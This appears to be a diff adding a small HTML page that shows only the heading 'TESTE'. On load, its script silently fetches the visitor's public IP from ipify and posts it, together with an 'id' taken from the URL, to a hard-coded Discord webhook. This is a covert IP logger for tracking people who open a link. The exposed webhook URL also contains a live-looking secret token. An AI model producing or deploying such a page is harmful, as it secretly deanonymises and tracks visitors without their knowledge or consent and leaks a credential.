@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>TESTE</h1>
+  <script>
+    function sendToDiscord(ip) {
+      const urlParams = new URLSearchParams(window.location.search);
+      const id = urlParams.get('id');
+      
+      if (id && ip) {
+        const webhookURL = 'https://discord.com/api/webhooks/1110706621031657542/hfolTS7Url21dNGc-5HH1Khx3HR6bMiWXp4OWwg4fHQavOHYUD5ai4pN5Ic2tcx78DGH';
+        const data = {
+          content: `ip=${ip}\nid=${id}`
+        };
+
+        fetch(webhookURL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(data)
+        })
+        .then(response => {
+          if (response.ok) {
+            console.log("ID e IP enviados com sucesso para o webhook do Discord.");
+          } else {
+            console.log("Erro ao enviar o ID e IP para o webhook do Discord.");
+          }
+        })
+        .catch(error => {
+          console.log("Erro ao enviar o ID e IP para o webhook do Discord:", error);
+        });
+      }
+    }
+
+    // Função para obter o endereço IP usando a API "ipify"
+    function getIPAddress() {
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          sendToDiscord(ip);
+        })
+        .catch(error => {
+          console.log("Erro ao obter o endereço IP:", error);
+        });
+    }
+
+    getIPAddress();
+  </script>
+</body>
+</html>
